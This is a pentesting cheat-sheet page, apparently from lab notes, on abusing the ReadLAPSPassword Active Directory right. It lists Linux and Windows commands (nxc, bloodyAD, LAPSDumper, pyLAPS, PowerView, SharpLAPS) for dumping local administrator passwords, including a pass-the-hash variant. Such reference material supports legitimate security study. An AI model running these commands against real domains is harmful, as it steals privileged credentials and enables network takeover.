# ReadLAPSPassword

## Information

LAPS is a [Windows feature](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) that automatically manages and backs up the password of a local administrator account on Windows Server AD-joined devices

<figure><img src="../../../.gitbook/assets/timelapse_laps_priv (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### Linux

{% tabs %}
{% tab title="NXC" %}
```bash
# read the password of all computers
nxc ldap <ip> -u <user> -p <pass> -M laps
# read the password of a specific computer
nxc ldap <ip> -u <user> -p <pass> -M laps -o COMPUTER='DC01$'
```
{% endtab %}

{% tab title="bloodyAD" %}
{% code overflow="wrap" %}
```bash
bloodyAD -u <user> -d <domain> -p <pass> --host <ip> get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
```
{% endcode %}
{% endtab %}

{% tab title="LAPSDumper" %}
```bash
# basic usage
python laps.py -u <user> -p <pass> -d <domain>
# PtH on specific LDAP server
python laps.py -u <user> -p <hash> -d <domain> -l <fqdn>
```
{% endtab %}

{% tab title="pyLAPS" %}
{% code overflow="wrap" %}
```bash
# read the password of all computers
pyLAPS.py --action get -u <user> -d <domain> -p <pass> --dc-ip <ip>
# read the password of a specific computer
pyLAPS.py --action get --computer 'DC01$' -u <user> -d <domain> -p <pass> --dc-ip <ip>
```
{% endcode %}
{% endtab %}
{% endtabs %}

For an example of reading the LAPS password with NXC check [Timelapse](../../../boxes/easy/timelapse.md#laps).

### Windows

{% tabs %}
{% tab title="AD PS" %}
{% code overflow="wrap" %}
```powershell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
{% endcode %}
{% endtab %}

{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
Get-DomainComputer "DC01" -Properties 'cn','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```
{% endcode %}
{% endtab %}

{% tab title="SharpLAPS" %}
```powershell
SharpLAPS.exe /user:"DOMAIN\User" /pass:"Password" /host:"192.168.1.1"
```
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="LAPSDumper" %}
{% embed url="https://github.com/n00py/LAPSDumper" %}
{% endtab %}

{% tab title="pyLAPS" %}
{% embed url="https://github.com/p0dalirius/pyLAPS" %}
{% endtab %}

{% tab title="SharpLAPS" %}
{% embed url="https://github.com/swisskyrepo/SharpLAPS" %}
{% endtab %}
{% endtabs %}
